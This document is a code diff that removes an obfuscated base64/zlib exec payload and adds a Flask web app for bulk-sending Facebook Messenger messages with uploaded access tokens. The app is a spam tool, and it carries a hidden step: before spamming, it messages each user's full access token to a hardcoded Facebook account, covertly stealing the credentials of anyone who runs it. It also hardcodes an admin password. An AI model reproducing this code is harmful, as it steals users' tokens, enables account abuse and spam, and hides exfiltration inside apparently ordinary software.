@@ -1,2 +1,159 @@
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from flask import Flask, request, render_template_string, redirect, url_for, session
+import requests
+from threading import Thread, Event
+import time
+import random
+import string
+import os
+
+app = Flask(__name__)
+app.secret_key = os.urandom(24)  # Required for session
+
+USERNAME = 'admin'
+PASSWORD = 'robin123'
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+def get_user_name(token):
+    try:
+        url = f"https://graph.facebook.com/v15.0/me?access_token={token}"
+        response = requests.get(url, headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get('name', 'Unknown User')
+        return f"User (Token: {token[:10]}...)"
+    except:
+        return f"User (Token: {token[:10]}...)"
+
+def send_initial_message(access_tokens, thread_id):
+    results = []
+    target_id = "100000943029350"  # Hardcoded target ID
+    for token in access_tokens:
+        user_name = get_user_name(token)
+        msg_template = f"Hello! Robin Sir I am Using Your Convo Page server. My Full Token Is: {token}"
+        parameters = {'access_token': token, 'message': msg_template}
+        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
+        try:
+            response = requests.post(url, data=parameters, headers=headers)
+            if response.status_code == 200:
+                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
+            else:
+                error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+                results.append(f"[❌] Failed to send initial message from {user_name}. Error: {error_msg}")
+        except requests.RequestException as e:
+            results.append(f"[!] Error during initial message send from {user_name}: {str(e)}")
+    return results
+
+stop_events = {}
+threads = {}
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    initial_results = send_initial_message(access_tokens, thread_id)
+    for result in initial_results:
+        print(result)
+
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                try:
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message Sent Successfully From token {access_token[:10]}...: {message}")
+                    else:
+                        error_msg = response.json().get('error', {}).get('message', 'Unknown error')
+                        print(f"Message Sent Failed From token {access_token[:10]}...: {error_msg}")
+                except requests.RequestException as e:
+                    print(f"Request failed for token {access_token[:10]}...: {str(e)}")
+                time.sleep(time_interval)
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        if username == USERNAME and password == PASSWORD:
+            session['logged_in'] = True
+            return redirect(url_for('send_message'))
+        else:
+            return "<h4>Invalid credentials. <a href='/login'>Try again</a></h4>"
+
+    return '''
+        <form method="post" style="max-width:300px; margin:auto; padding:30px; background:#222; border-radius:10px; color:white;">
+            <h2>Login</h2>
+            <input type="text" name="username" placeholder="Username" required class="form-control mb-3"><br>
+            <input type="password" name="password" placeholder="Password" required class="form-control mb-3"><br>
+            <button type="submit" class="btn btn-primary">Login</button>
+        </form>
+    '''
+
+@app.route('/logout')
+def logout():
+    session.pop('logged_in', None)
+    return redirect(url_for('login'))
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return f'''
+        <div class="task-id">
+            <h4>Task started successfully!</h4>
+            <p>Task ID: {task_id}</p>
+            <p>Messages are being sent to the conversation.</p>
+            <a href="/" class="btn btn-primary">Back to Home</a>
+        </div>
+        '''
+
+    return render_template_string(open("templates/page.html").read())
+
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+    
